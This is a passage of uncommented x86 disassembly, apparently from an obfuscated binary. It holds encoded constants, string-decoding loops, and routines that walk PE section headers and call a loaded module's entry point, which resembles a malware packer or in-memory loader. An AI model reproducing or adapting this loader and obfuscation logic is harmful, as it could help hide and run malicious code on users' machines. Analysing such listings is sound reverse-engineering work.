  42750d:	add    ecx,edi
  42750f:	je     0x4276cc
  427515:	mov    eax,DWORD PTR [ebp-0x4]
  427518:	xor    eax,esi
  42751a:	add    eax,edi
  42751c:	and    DWORD PTR [ebp+0x8],0x0
  427520:	mov    DWORD PTR [ebp-0x14],eax
  427523:	mov    eax,0xf89c85d9
  427528:	lea    ecx,[eax-0x8]
  42752b:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427532:	mov    DWORD PTR [ebp-0x54],0xf89c8529
  427539:	mov    DWORD PTR [ebp-0x50],eax
  42753c:	mov    DWORD PTR [ebp-0x4c],ecx
  42753f:	mov    DWORD PTR [ebp-0x48],ecx
  427542:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427549:	mov    edx,DWORD PTR [ebp+0x8]
  42754c:	mov    ecx,0x8aa
  427551:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427556:	mov    edx,0x72f1
  42755b:	add    cx,dx
  42755e:	mov    edx,DWORD PTR [ebp+0x8]
  427561:	inc    DWORD PTR [ebp+0x8]
  427564:	cmp    DWORD PTR [ebp+0x8],0x6
  427568:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427570:	jb     0x427549
  427572:	mov    ecx,0xf89c852b
  427577:	mov    DWORD PTR [ebp-0xb0],eax
  42757d:	mov    DWORD PTR [ebp-0x9c],eax
  427583:	mov    DWORD PTR [ebp-0x74],eax
  427586:	mov    DWORD PTR [ebp-0x70],eax
  427589:	lea    eax,[ecx-0x3]
  42758c:	mov    edx,0xf89c85ff
  427591:	mov    DWORD PTR [ebp-0x64],eax
  427594:	mov    DWORD PTR [ebp-0x60],eax
  427597:	mov    DWORD PTR [ebp-0xb4],0xf89c85f1
  4275a1:	mov    DWORD PTR [ebp-0xac],ecx
  4275a7:	mov    DWORD PTR [ebp-0xa8],edx
  4275ad:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  4275b7:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  4275c1:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  4275cb:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  4275d5:	mov    DWORD PTR [ebp-0x90],0xf89c8529
  4275df:	mov    DWORD PTR [ebp-0x8c],ecx
  4275e5:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  4275ef:	mov    DWORD PTR [ebp-0x84],edx
  4275f5:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  4275fc:	mov    DWORD PTR [ebp-0x7c],ecx
  4275ff:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  427606:	mov    DWORD PTR [ebp-0x6c],ecx
  427609:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427610:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427617:	xor    eax,eax
  427619:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427620:	xor    cl,0xaa
  427623:	sub    cl,0xf
  427626:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  42762d:	inc    eax
  42762e:	cmp    eax,0x17
  427631:	jb     0x427619
  427633:	mov    eax,DWORD PTR [ebx+0x1e0]
  427639:	lea    ecx,[ebp-0xc0]
  42763f:	push   ecx
  427640:	call   DWORD PTR [eax+0x4]
  427643:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427649:	lea    edx,[ebp-0xd8]
  42764f:	push   edx
  427650:	push   eax
  427651:	call   DWORD PTR [ecx+0x8]
  427654:	mov    DWORD PTR [ebp-0x40],eax
  427657:	lea    eax,[ebp-0x14]
  42765a:	push   eax
  42765b:	mov    eax,DWORD PTR [ebx+0x18c]
  427661:	push   DWORD PTR [eax]
  427663:	mov    eax,DWORD PTR [ebp-0x40]
  427666:	call   eax
  427668:	mov    eax,DWORD PTR [ebp-0x4]
  42766b:	xor    eax,esi
  42766d:	add    eax,edi
  42766f:	mov    DWORD PTR [ebp-0x34],eax
  427672:	mov    ecx,DWORD PTR [ebp-0x4]
  427675:	mov    eax,DWORD PTR [ebp-0x14]
  427678:	xor    ecx,esi
  42767a:	add    ecx,edi
  42767c:	cmp    eax,ecx
  42767e:	je     0x4276c9
  427680:	mov    DWORD PTR [ebp-0x3c],eax
  427683:	jmp    0x427694
  427685:	mov    eax,DWORD PTR [eax]
  427687:	mov    ecx,DWORD PTR [ebp-0x3c]
  42768a:	mov    DWORD PTR [ebp-0x14],eax
  42768d:	mov    eax,DWORD PTR [ebp-0x14]
  427690:	cmp    eax,ecx
  427692:	je     0x4276a1
  427694:	mov    edx,DWORD PTR [eax+0x18]
  427697:	mov    ecx,DWORD PTR [ebx+0x18c]
  42769d:	cmp    edx,DWORD PTR [ecx]
  42769f:	jne    0x427685
  4276a1:	mov    ecx,DWORD PTR [ebx+0x18c]
  4276a7:	mov    edx,DWORD PTR [eax+0x18]
  4276aa:	cmp    edx,DWORD PTR [ecx]
  4276ac:	jne    0x4276c9
  4276ae:	mov    ecx,DWORD PTR [ebx+0x190]
  4276b4:	mov    edx,DWORD PTR [ebp-0x20]
  4276b7:	mov    edx,DWORD PTR [edx+0x28]
  4276ba:	add    edx,DWORD PTR [ecx]
  4276bc:	mov    DWORD PTR [eax+0x1c],edx
  4276bf:	mov    eax,DWORD PTR [ebp-0x24]
  4276c2:	xor    eax,esi
  4276c4:	add    eax,edi
  4276c6:	mov    DWORD PTR [ebp-0x34],eax
  4276c9:	mov    eax,DWORD PTR [ebp+0xc]
  4276cc:	push   ebx
  4276cd:	push   eax
  4276ce:	push   DWORD PTR [ebp+0x20]
  4276d1:	call   0x426e4f
  4276d6:	test   eax,eax
  4276d8:	je     0x4277a1
  4276de:	push   DWORD PTR [ebp+0xc]
  4276e1:	mov    ecx,ebx
  4276e3:	push   DWORD PTR [ebp+0x20]
  4276e6:	call   0x426da8
  4276eb:	test   eax,eax
  4276ed:	je     0x4277a1
  4276f3:	mov    eax,DWORD PTR [ebp+0xc]
  4276f6:	mov    edx,DWORD PTR [ebp+0x20]
  4276f9:	mov    ecx,ebx
  4276fb:	call   0x426c81
  427700:	test   eax,eax
  427702:	je     0x4277a1
  427708:	push   ebx
  427709:	push   DWORD PTR [ebp+0x20]
  42770c:	call   0x427132
  427711:	test   eax,eax
  427713:	je     0x4277a1
  427719:	mov    eax,DWORD PTR [ebx+0x18c]
  42771f:	mov    edx,DWORD PTR [ebp+0x20]
  427722:	cmp    edx,DWORD PTR [eax]
  427724:	jne    0x427740
  427726:	mov    eax,DWORD PTR [ebx+0x1e0]
  42772c:	lea    ecx,[ebp-0x18]
  42772f:	push   ecx
  427730:	push   DWORD PTR [ebp-0x18]
  427733:	mov    ecx,DWORD PTR [ebp-0x20]
  427736:	push   DWORD PTR [ecx+0x54]
  427739:	push   edx
  42773a:	call   DWORD PTR [eax+0x1c]
  42773d:	mov    edx,DWORD PTR [ebp+0x20]
  427740:	mov    eax,DWORD PTR [ebx+0x1c8]
  427746:	mov    eax,DWORD PTR [eax]
  427748:	xor    eax,esi
  42774a:	add    eax,edi
  42774c:	je     0x427785
  42774e:	mov    ecx,DWORD PTR [ebp+0xc]
  427751:	mov    eax,DWORD PTR [ecx+0x28]
  427754:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  42775b:	mov    esi,DWORD PTR [ebp+0x8]
  42775e:	push   DWORD PTR [ebp+0x14]
  427761:	xor    esi,0x8aa
  427767:	push   DWORD PTR [ebp+0x10]
  42776a:	add    esi,0x72f1
  427770:	or     WORD PTR [ecx+0x16],si
  427774:	add    eax,edx
  427776:	push   edx
  427777:	call   eax
  427779:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  427783:	jmp    0x42778f
  427785:	mov    eax,DWORD PTR [ebp+0xc]
  427788:	mov    eax,DWORD PTR [eax+0x28]
  42778b:	add    eax,edx
  42778d:	call   eax
  42778f:	mov    DWORD PTR [ebp-0x8],eax
  427792:	mov    eax,DWORD PTR [ebp-0x8]
  427795:	mov    ecx,DWORD PTR [ebp+0x1c]
  427798:	mov    DWORD PTR [ecx],eax
  42779a:	mov    DWORD PTR [ebp-0x30],0x1
  4277a1:	cmp    DWORD PTR [ebp-0x30],0x0
  4277a5:	jne    0x4277ab
  4277a7:	and    DWORD PTR [ebp+0x20],0x0
  4277ab:	mov    eax,DWORD PTR [ebp+0x20]
  4277ae:	jmp    0x4277b2
  4277b0:	xor    eax,eax
  4277b2:	pop    edi
  4277b3:	pop    esi
  4277b4:	pop    ebx
  4277b5:	leave  
  4277b6:	ret    0x1c
  4277b9:	push   ebp
  4277ba:	mov    ebp,esp
  4277bc:	movzx  edx,WORD PTR [ecx+0x6]
  4277c0:	movzx  eax,WORD PTR [ecx+0x14]
  4277c4:	push   ebx
  4277c5:	push   edi
  4277c6:	xor    edi,edi
  4277c8:	lea    eax,[eax+ecx*1+0x18]
  4277cc:	test   edx,edx
  4277ce:	je     0x4277ef
  4277d0:	mov    ecx,DWORD PTR [eax+0xc]
  4277d3:	lea    ebx,[ecx+esi*1]
  4277d6:	cmp    DWORD PTR [ebp+0x8],ebx
  4277d9:	jb     0x4277e7
  4277db:	mov    ebx,DWORD PTR [eax+0x8]
  4277de:	add    ebx,ecx
  4277e0:	add    ebx,esi
  4277e2:	cmp    DWORD PTR [ebp+0x8],ebx
  4277e5:	jb     0x4277f1
  4277e7:	add    eax,0x28
  4277ea:	inc    edi
  4277eb:	cmp    edi,edx
  4277ed:	jb     0x4277d0
  4277ef:	xor    eax,eax
  4277f1:	pop    edi
  4277f2:	pop    ebx
  4277f3:	pop    ebp
  4277f4:	ret    0x4
  4277f7:	push   ebp
  4277f8:	mov    ebp,esp
  4277fa:	sub    esp,0x34
  4277fd:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427804:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  42780b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  427812:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  427819:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  427820:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  427827:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  42782e:	mov    DWORD PTR [ebp-0x10],eax
  427831:	mov    eax,DWORD PTR [ebp+0x8]
  427834:	mov    DWORD PTR [ebp-0x14],eax
  427837:	mov    eax,DWORD PTR [ebp-0xc]
  42783a:	push   ebx
  42783b:	mov    ecx,0x75108aa
  427840:	xor    eax,ecx
  427842:	push   esi
  427843:	mov    esi,DWORD PTR [ebp-0x10]
  427846:	mov    edx,0x3272f1
  42784b:	add    eax,edx
  42784d:	push   edi
  42784e:	cmp    esi,eax
  427850:	je     0x427a2f
  427856:	mov    eax,DWORD PTR [ebp-0xc]
  427859:	mov    esi,DWORD PTR [ebp-0x14]
  42785c:	xor    eax,ecx
  42785e:	add    eax,edx
  427860:	cmp    esi,eax
  427862:	je     0x427a2f
  427868:	mov    eax,DWORD PTR [ebp-0xc]
  42786b:	xor    eax,ecx
  42786d:	add    eax,edx
  42786f:	mov    DWORD PTR [ebp-0x24],eax
  427872:	mov    eax,DWORD PTR [ebp-0xc]
  427875:	xor    eax,ecx
  427877:	add    eax,edx
  427879:	mov    DWORD PTR [ebp-0x28],eax
  42787c:	mov    edi,DWORD PTR [ebp-0x20]
  42787f:	mov    ebx,DWORD PTR [ebp-0x8]
  427882:	mov    esi,0x8aa
  427887:	xor    edi,esi
  427889:	mov    eax,0x72f1
  42788e:	xor    ebx,esi
  427890:	add    edi,eax
  427892:	add    ebx,eax
  427894:	sub    ebx,edi
  427896:	mov    WORD PTR [ebp-0x8],bx
  42789a:	jmp    0x42795f
  42789f:	mov    edi,DWORD PTR [ebp-0xc]
  4278a2:	mov    bx,WORD PTR [ebp-0x4]
  4278a6:	xor    edi,esi
  4278a8:	add    edi,eax
  4278aa:	cmp    bx,di
  4278ad:	je     0x4279a1
  4278b3:	mov    edi,DWORD PTR [ebp-0xc]
  4278b6:	mov    ebx,DWORD PTR [ebp+0xc]
  4278b9:	xor    edi,ecx
  4278bb:	add    edi,edx
  4278bd:	cmp    ebx,edi
  4278bf:	mov    di,WORD PTR [ebp-0x4]
  4278c3:	mov    bx,WORD PTR [ebp+0x8]
  4278c7:	je     0x427932
  4278c9:	cmp    bx,di
  4278cc:	je     0x42793b
  4278ce:	mov    edi,DWORD PTR [ebp-0x20]
  4278d1:	mov    bx,WORD PTR [ebp+0x8]
  4278d5:	xor    edi,esi
  4278d7:	add    edi,eax
  4278d9:	cmp    bx,di
  4278dc:	jb     0x4278fc
  4278de:	mov    edi,DWORD PTR [ebp-0x2c]
  4278e1:	mov    bx,WORD PTR [ebp+0x8]
  4278e5:	xor    edi,esi
  4278e7:	add    edi,eax
  4278e9:	cmp    bx,di
  4278ec:	ja     0x4278fc
  4278ee:	movzx  edi,WORD PTR [ebp+0x8]
  4278f2:	movzx  ebx,WORD PTR [ebp-0x8]
  4278f6:	add    edi,ebx
  4278f8:	mov    WORD PTR [ebp+0x8],di
  4278fc:	mov    edi,DWORD PTR [ebp-0x20]
  4278ff:	mov    bx,WORD PTR [ebp-0x4]
  427903:	xor    edi,esi
  427905:	add    edi,eax
  427907:	cmp    bx,di
  42790a:	jb     0x42792a
  42790c:	mov    edi,DWORD PTR [ebp-0x2c]
  42790f:	mov    bx,WORD PTR [ebp-0x4]
  427913:	xor    edi,esi
  427915:	add    edi,eax
  427917:	cmp    bx,di
  42791a:	ja     0x42792a
  42791c:	movzx  edi,WORD PTR [ebp-0x4]
  427920:	movzx  ebx,WORD PTR [ebp-0x8]
  427924:	add    edi,ebx
  427926:	mov    WORD PTR [ebp-0x4],di
  42792a:	mov    di,WORD PTR [ebp-0x4]
  42792e:	mov    bx,WORD PTR [ebp+0x8]
  427932:	cmp    bx,di
  427935:	jne    0x427a2f
  42793b:	mov    edi,DWORD PTR [ebp-0x1c]
  42793e:	mov    ebx,DWORD PTR [ebp-0x10]
  427941:	xor    edi,ecx
  427943:	lea    edi,[edi+ebx*1+0x3272f1]
  42794a:	mov    DWORD PTR [ebp-0x10],edi
  42794d:	mov    edi,DWORD PTR [ebp-0x1c]
  427950:	mov    ebx,DWORD PTR [ebp-0x14]
  427953:	xor    edi,ecx
  427955:	lea    edi,[edi+ebx*1+0x3272f1]
  42795c:	mov    DWORD PTR [ebp-0x14],edi
  42795f:	mov    edi,DWORD PTR [ebp-0x24]
  427962:	mov    ebx,DWORD PTR [ebp-0x10]
  427965:	mov    di,WORD PTR [ebx+edi*2]
  427969:	mov    WORD PTR [ebp+0x8],di
  42796d:	mov    edi,DWORD PTR [ebp-0x28]
  427970:	mov    ebx,DWORD PTR [ebp-0x14]
  427973:	mov    di,WORD PTR [ebx+edi*2]
  427977:	mov    WORD PTR [ebp-0x4],di
  42797b:	mov    edi,DWORD PTR [ebp-0xc]
  42797e:	mov    bx,WORD PTR [ebp+0x8]
  427982:	xor    edi,esi
  427984:	add    edi,eax
  427986:	cmp    bx,di
  427989:	jne    0x42789f
  42798f:	mov    eax,DWORD PTR [ebp-0x18]
  427992:	mov    esi,DWORD PTR [ebp-0xc]
  427995:	xor    eax,ecx
  427997:	add    eax,edx
  427999:	imul   eax,esi
  42799c:	mov    DWORD PTR [ebp-0xc],eax
  42799f:	jmp    0x4279b3
  4279a1:	mov    eax,DWORD PTR [ebp-0xc]
  4279a4:	mov    esi,DWORD PTR [ebp-0x18]
  4279a7:	xor    eax,ecx
  4279a9:	lea    eax,[eax+esi*1+0x3272f1]
  4279b0:	mov    DWORD PTR [ebp-0x18],eax
  4279b3:	mov    eax,DWORD PTR [ebp-0x24]
  4279b6:	sub    eax,edx
  4279b8:	xor    eax,ecx
  4279ba:	mov    DWORD PTR [ebp-0x30],eax
  4279bd:	mov    eax,DWORD PTR [ebp-0x28]
  4279c0:	sub    eax,edx
  4279c2:	xor    eax,ecx
  4279c4:	mov    DWORD PTR [ebp-0x34],eax
  4279c7:	mov    eax,DWORD PTR [ebp-0x34]
  4279ca:	mov    esi,DWORD PTR [ebp-0x1c]
  4279cd:	xor    esi,ecx
  4279cf:	add    esi,edx
  4279d1:	xor    eax,ecx
  4279d3:	add    eax,0x3272f1
  4279d8:	imul   esi,eax
  4279db:	mov    eax,DWORD PTR [ebp-0x14]
  4279de:	movzx  eax,WORD PTR [esi+eax*1]
  4279e2:	mov    esi,DWORD PTR [ebp-0x30]
  4279e5:	mov    edi,DWORD PTR [ebp-0x1c]
  4279e8:	xor    esi,ecx
  4279ea:	add    esi,edx
  4279ec:	xor    edi,ecx
  4279ee:	add    edi,edx
  4279f0:	imul   edi,esi
  4279f3:	mov    esi,DWORD PTR [ebp-0x10]
  4279f6:	movzx  esi,WORD PTR [edi+esi*1]
  4279fa:	sub    eax,edx
  4279fc:	sub    esi,edx
  4279fe:	xor    eax,ecx
  427a00:	xor    esi,ecx
  427a02:	cmp    esi,eax
  427a04:	jne    0x427a2f
  427a06:	mov    eax,DWORD PTR [ebp-0x30]
  427a09:	mov    esi,DWORD PTR [ebp-0x1c]
  427a0c:	xor    eax,ecx
  427a0e:	add    eax,0x3272f1
  427a13:	xor    esi,ecx
  427a15:	add    esi,edx
  427a17:	imul   esi,eax
  427a1a:	mov    eax,DWORD PTR [ebp-0x10]
  427a1d:	movzx  eax,WORD PTR [esi+eax*1]
  427a21:	mov    esi,DWORD PTR [ebp-0xc]
  427a24:	sub    eax,edx
  427a26:	xor    eax,ecx
  427a28:	cmp    eax,esi
  427a2a:	mov    eax,DWORD PTR [ebp-0xc]
  427a2d:	je     0x427a32
  427a2f:	mov    eax,DWORD PTR [ebp-0x18]
  427a32:	pop    edi
  427a33:	xor    eax,ecx
  427a35:	pop    esi
  427a36:	add    eax,edx
  427a38:	pop    ebx
  427a39:	leave  
  427a3a:	ret    0x8
  427a3d:	push   ebp
  427a3e:	mov    ebp,esp
  427a40:	push   ecx
  427a41:	mov    cx,WORD PTR [eax]
  427a44:	push   esi
  427a45:	mov    esi,0x3b5a
  427a4a:	sub    cx,si
  427a4d:	mov    esi,0x8a98
  427a52:	xor    cx,si
  427a55:	mov    esi,0x4e3e
  427a5a:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427a61:	mov    edx,0xf89c85a5
  427a66:	cmp    cx,si
  427a69:	je     0x427ac8
  427a6b:	push   ebx
  427a6c:	push   edi
  427a6d:	movzx  ecx,cx
  427a70:	mov    edi,0xffcd8d0f
  427a75:	mov    esi,0x75108aa
  427a7a:	mov    ebx,0x4f9a
  427a7f:	cmp    cx,bx
  427a82:	jne    0x427a87
  427a84:	mov    DWORD PTR [ebp-0x4],edx
  427a87:	lea    edx,[edi+0x1]
  427a8a:	xor    edx,esi
  427a8c:	mov    edi,edx
  427a8e:	xor    edi,esi
  427a90:	mov    cx,WORD PTR [eax+edi*2+0x64e5e2]
  427a98:	mov    ebx,0x3b5a
  427a9d:	sub    cx,bx
  427aa0:	mov    ebx,0x8a98
  427aa5:	xor    cx,bx
  427aa8:	mov    ebx,0x4e3e
  427aad:	cmp    cx,bx
  427ab0:	jne    0x427a7a
  427ab2:	mov    ecx,DWORD PTR [ebp-0x4]
  427ab5:	pop    edi
  427ab6:	pop    ebx
  427ab7:	cmp    ecx,0xf89c85a4
  427abd:	je     0x427ac8
  427abf:	xor    ecx,esi
  427ac1:	lea    eax,[eax+ecx*2+0x64e5e4]
  427ac8:	pop    esi
  427ac9:	leave  
  427aca:	ret    
  427acb:	push   ebp
  427acc:	mov    ebp,esp
  427ace:	push   ecx
  427acf:	push   esi
  427ad0:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427ad7:	mov    esi,0xf89c85a5
  427adc:	call   0x427a3d
  427ae1:	mov    cl,BYTE PTR [eax]
  427ae3:	dec    cl
  427ae5:	xor    cl,0x7c
  427ae8:	cmp    cl,0x83
  427aeb:	je     0x427b50
  427aed:	push   ebx
  427aee:	push   edi
  427aef:	mov    edx,eax
  427af1:	mov    edi,0xffcd8d0f
  427af6:	mov    ecx,0x75108aa
  427afb:	mov    dx,WORD PTR [edx]
  427afe:	mov    ebx,0x3b5a
  427b03:	sub    dx,bx
  427b06:	mov    ebx,0x8a98
  427b0b:	xor    dx,bx
  427b0e:	mov    ebx,0x4e4c
  427b13:	cmp    dx,bx
  427b16:	jne    0x427b1b
  427b18:	mov    DWORD PTR [ebp-0x4],esi
  427b1b:	lea    esi,[edi+0x1]
  427b1e:	xor    esi,ecx
  427b20:	mov    edi,esi
  427b22:	xor    edi,ecx
  427b24:	lea    edx,[eax+edi*2+0x64e5e2]
  427b2b:	mov    bl,BYTE PTR [edx]
  427b2d:	dec    bl
  427b2f:	xor    bl,0x7c
  427b32:	cmp    bl,0x83
  427b35:	jne    0x427afb
  427b37:	mov    edx,DWORD PTR [ebp-0x4]
  427b3a:	pop    edi
  427b3b:	pop    ebx
  427b3c:	cmp    edx,0xf89c85a4
  427b42:	je     0x427b50
  427b44:	xor    edx,ecx
  427b46:	xor    ecx,ecx
  427b48:	mov    WORD PTR [eax+edx*2+0x64e5e2],cx
  427b50:	pop    esi
  427b51:	leave  
  427b52:	ret    
  427b53:	push   ebp
  427b54:	mov    ebp,esp
  427b56:	push   ecx
  427b57:	push   esi
  427b58:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427b5f:	mov    esi,0xf89c85a5
  427b64:	call   0x427a3d
  427b69:	mov    cx,WORD PTR [eax]
  427b6c:	mov    edx,0x3b5a
  427b71:	sub    cx,dx
  427b74:	mov    edx,0x8a98
  427b79:	xor    cx,dx
  427b7c:	mov    edx,0x4e3e
  427b81:	cmp    cx,dx
  427b84:	je     0x427bdd
  427b86:	push   ebx
  427b87:	push   edi
  427b88:	movzx  ecx,cx
  427b8b:	mov    edx,0xffcd8d0f
  427b90:	mov    edi,0x75108aa
  427b95:	mov    ebx,0x4e4c
  427b9a:	cmp    cx,bx
  427b9d:	jne    0x427ba2
  427b9f:	mov    DWORD PTR [ebp-0x4],esi
  427ba2:	lea    esi,[edx+0x1]
  427ba5:	xor    esi,edi
  427ba7:	mov    edx,esi
  427ba9:	xor    edx,edi
  427bab:	mov    cx,WORD PTR [eax+edx*2+0x64e5e2]
  427bb3:	mov    ebx,0x3b5a
  427bb8:	sub    cx,bx
  427bbb:	mov    ebx,0x8a98
  427bc0:	xor    cx,bx
  427bc3:	mov    ebx,0x4e3e
  427bc8:	cmp    cx,bx
  427bcb:	jne    0x427b95
  427bcd:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  427bd4:	pop    edi
  427bd5:	pop    ebx
  427bd6:	je     0x427bdd
  427bd8:	xor    eax,eax
  427bda:	inc    eax
  427bdb:	jmp    0x427bdf
  427bdd:	xor    eax,eax
  427bdf:	pop    esi
  427be0:	leave  
  427be1:	ret    
  427be2:	push   ebp
  427be3:	mov    ebp,esp
  427be5:	push   ecx
  427be6:	mov    eax,DWORD PTR [ebp+0x8]
  427be9:	movzx  ecx,WORD PTR [eax]
  427bec:	push   esi
  427bed:	lea    eax,[ecx-0x3b5a]
  427bf3:	mov    esi,0x8a98
  427bf8:	push   edi
  427bf9:	xor    eax,esi
  427bfb:	mov    edi,0x4e3e
  427c00:	mov    DWORD PTR [ebp-0x4],edx
  427c03:	cmp    ax,di
  427c06:	je     0x427c33
  427c08:	mov    eax,DWORD PTR [ebp+0x8]
  427c0b:	sub    eax,edx
  427c0d:	mov    DWORD PTR [ebp+0x8],eax
  427c10:	jmp    0x427c15
  427c12:	mov    eax,DWORD PTR [ebp+0x8]
  427c15:	mov    WORD PTR [edx],cx
  427c18:	add    edx,0x2
  427c1b:	movzx  edi,WORD PTR [eax+edx*1]
  427c1f:	mov    ecx,edi
  427c21:	add    edi,0xffffc4a6
  427c27:	xor    edi,esi
  427c29:	mov    eax,0x4e3e
  427c2e:	cmp    di,ax
  427c31:	jne    0x427c12
  427c33:	xor    eax,eax
  427c35:	pop    edi
  427c36:	mov    WORD PTR [edx],ax
  427c39:	mov    eax,DWORD PTR [ebp-0x4]
  427c3c:	pop    esi
  427c3d:	leave  
  427c3e:	ret    0x4
  427c41:	push   ebp
  427c42:	mov    ebp,esp
  427c44:	sub    esp,0x18
  427c47:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  427c4e:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427c55:	mov    ecx,DWORD PTR [ebp-0x8]
  427c58:	push   esi
  427c59:	mov    eax,0x75108aa
  427c5e:	xor    ecx,eax
  427c60:	mov    esi,0x3272f1
  427c65:	add    ecx,esi
  427c67:	mov    DWORD PTR [ebp-0x4],ecx
  427c6a:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  427c71:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427c78:	push   edi
  427c79:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  427c80:	jmp    0x427d21
  427c85:	mov    ecx,DWORD PTR [ebp-0x4]
  427c88:	mov    edx,DWORD PTR [ebp+0x10]
  427c8b:	sub    edx,ecx
  427c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  427c90:	xor    ecx,eax
  427c92:	add    ecx,esi
  427c94:	cmp    edx,ecx
  427c96:	jbe    0x427cb3
  427c98:	mov    edx,DWORD PTR [ebp-0x4]
  427c9b:	add    edx,DWORD PTR [ebp+0x8]
  427c9e:	mov    ecx,DWORD PTR [ebp-0x4]
  427ca1:	add    ecx,DWORD PTR [ebp+0xc]
  427ca4:	mov    edi,DWORD PTR [ecx]
  427ca6:	mov    DWORD PTR [edx],edi
  427ca8:	mov    ecx,DWORD PTR [ecx+0x4]
  427cab:	mov    DWORD PTR [edx+0x4],ecx
  427cae:	mov    ecx,DWORD PTR [ebp-0xc]
  427cb1:	jmp    0x427d00
  427cb3:	mov    ecx,DWORD PTR [ebp-0x4]
  427cb6:	mov    edx,DWORD PTR [ebp+0x10]
  427cb9:	sub    edx,ecx
  427cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  427cbe:	xor    ecx,eax
  427cc0:	add    ecx,esi
  427cc2:	cmp    edx,ecx
  427cc4:	mov    ecx,DWORD PTR [ebp-0x4]
  427cc7:	jbe    0x427cdb
  427cc9:	add    ecx,DWORD PTR [ebp+0x8]
  427ccc:	mov    edx,DWORD PTR [ebp-0x4]
  427ccf:	add    edx,DWORD PTR [ebp+0xc]
  427cd2:	mov    edx,DWORD PTR [edx]
  427cd4:	mov    DWORD PTR [ecx],edx
  427cd6:	mov    ecx,DWORD PTR [ebp-0x10]
  427cd9:	jmp    0x427d00
  427cdb:	mov    edx,DWORD PTR [ebp+0x10]
  427cde:	sub    edx,ecx
  427ce0:	mov    ecx,DWORD PTR [ebp-0x14]
  427ce3:	xor    ecx,eax
  427ce5:	add    ecx,esi
  427ce7:	cmp    edx,ecx
  427ce9:	mov    ecx,DWORD PTR [ebp-0x4]
  427cec:	jbe    0x427d11
  427cee:	add    ecx,DWORD PTR [ebp+0x8]
  427cf1:	mov    edx,DWORD PTR [ebp-0x4]
  427cf4:	add    edx,DWORD PTR [ebp+0xc]
  427cf7:	mov    dx,WORD PTR [edx]
  427cfa:	mov    WORD PTR [ecx],dx
  427cfd:	mov    ecx,DWORD PTR [ebp-0x14]
  427d00:	mov    edx,DWORD PTR [ebp-0x4]
  427d03:	xor    ecx,eax
  427d05:	lea    ecx,[ecx+edx*1+0x3272f1]
  427d0c:	mov    DWORD PTR [ebp-0x4],ecx
  427d0f:	jmp    0x427d21
  427d11:	add    ecx,DWORD PTR [ebp+0x8]
  427d14:	mov    edx,DWORD PTR [ebp-0x4]
  427d17:	add    edx,DWORD PTR [ebp+0xc]
  427d1a:	mov    dl,BYTE PTR [edx]
  427d1c:	mov    BYTE PTR [ecx],dl
  427d1e:	inc    DWORD PTR [ebp-0x4]
  427d21:	mov    ecx,DWORD PTR [ebp-0x18]
  427d24:	mov    edx,DWORD PTR [ebp+0x10]
  427d27:	xor    ecx,eax
  427d29:	add    ecx,esi
  427d2b:	imul   ecx,edx
  427d2e:	mov    edx,DWORD PTR [ebp-0x8]
  427d31:	mov    edi,DWORD PTR [ebp-0x4]
  427d34:	xor    edx,eax
  427d36:	lea    edx,[edx+edi*1+0x3272f1]
  427d3d:	cmp    edx,ecx
  427d3f:	jb     0x427c85
  427d45:	pop    edi
  427d46:	pop    esi
  427d47:	leave  
  427d48:	ret    0xc
  427d4b:	push   ebp
  427d4c:	mov    ebp,esp
  427d4e:	sub    esp,0xc
  427d51:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427d58:	push   esi
  427d59:	mov    esi,eax
  427d5b:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  427d62:	mov    edx,DWORD PTR [ebp-0x4]
  427d65:	mov    eax,0x75108aa
  427d6a:	xor    edx,eax
  427d6c:	mov    ecx,0x3272f1
  427d71:	add    edx,ecx
  427d73:	cmp    esi,edx
  427d75:	je     0x427db7
  427d77:	push   ebx
  427d78:	push   edi
  427d79:	mov    edx,DWORD PTR [ebp-0x8]
  427d7c:	mov    ebx,DWORD PTR [ebp+0x8]
  427d7f:	xor    edx,eax
  427d81:	mov    edi,0xffcd8d0f
  427d86:	sub    edi,edx
  427d88:	add    esi,edi
  427d8a:	lea    edx,[esi-0x3272f1]
  427d90:	xor    edx,eax
  427d92:	mov    DWORD PTR [ebp-0xc],edx
  427d95:	mov    edx,DWORD PTR [ebp-0x4]
  427d98:	mov    edi,DWORD PTR [ebp-0xc]
  427d9b:	xor    dl,0xaa
  427d9e:	sub    dl,0xf
  427da1:	xor    edi,eax
  427da3:	mov    BYTE PTR [edi+ebx*1+0x3272f1],dl
  427daa:	mov    edx,DWORD PTR [ebp-0x4]
  427dad:	xor    edx,eax
  427daf:	add    edx,ecx
  427db1:	cmp    esi,edx
  427db3:	jne    0x427d79
  427db5:	pop    edi
  427db6:	pop    ebx
